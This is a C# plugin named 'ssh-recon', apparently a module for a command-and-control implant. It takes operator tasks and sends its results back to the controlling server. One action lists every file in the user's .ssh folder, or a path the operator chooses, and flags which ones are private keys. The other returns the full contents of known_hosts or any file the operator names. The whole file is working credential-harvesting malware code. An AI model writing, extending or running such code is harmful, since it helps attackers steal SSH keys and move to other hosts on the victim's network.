using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "ssh-recon";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<ssh_recon.SshReconArgs>(
                    job.task.parameters) ?? new ssh_recon.SshReconArgs();

                string result = args.action switch
                {
                    "ssh-keys" => EnumSshKeys(args.path),
                    "known-hosts" => ReadFile(args.path, "known_hosts"),
                    _ => throw new ArgumentException($"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string EnumSshKeys(string extraPath)
        {
            var results = new List<Dictionary<string, object>>();
            var sshDirs = new List<string>();

            string homeSsh = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                ".ssh");
            if (Directory.Exists(homeSsh))
                sshDirs.Add(homeSsh);

            if (!string.IsNullOrEmpty(extraPath) && Directory.Exists(extraPath))
                sshDirs.Add(extraPath);

            foreach (string dir in sshDirs)
            {
                foreach (string file in Directory.GetFiles(dir))
                {
                    try
                    {
                        var fi = new FileInfo(file);
                        string firstLine = "";
                        try
                        {
                            using var sr = new StreamReader(file);
                            firstLine = sr.ReadLine() ?? "";
                        }
                        catch { }

                        results.Add(new Dictionary<string, object>
                        {
                            ["path"] = file,
                            ["name"] = fi.Name,
                            ["size"] = fi.Length,
                            ["is_private_key"] = firstLine.Contains("BEGIN") &&
                                                  firstLine.Contains("PRIVATE"),
                            ["last_modified"] = fi.LastWriteTimeUtc.ToString("o")
                        });
                    }
                    catch { }
                }
            }

            if (results.Count == 0)
                return "No SSH key files found";

            return JsonSerializer.Serialize(results,
                new JsonSerializerOptions { WriteIndented = true });
        }

        private string ReadFile(string path, string defaultName)
        {
            if (string.IsNullOrEmpty(path))
            {
                path = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                    ".ssh", defaultName);
            }

            if (!File.Exists(path))
                return $"File not found: {path}";

            return File.ReadAllText(path);
        }
    }
}
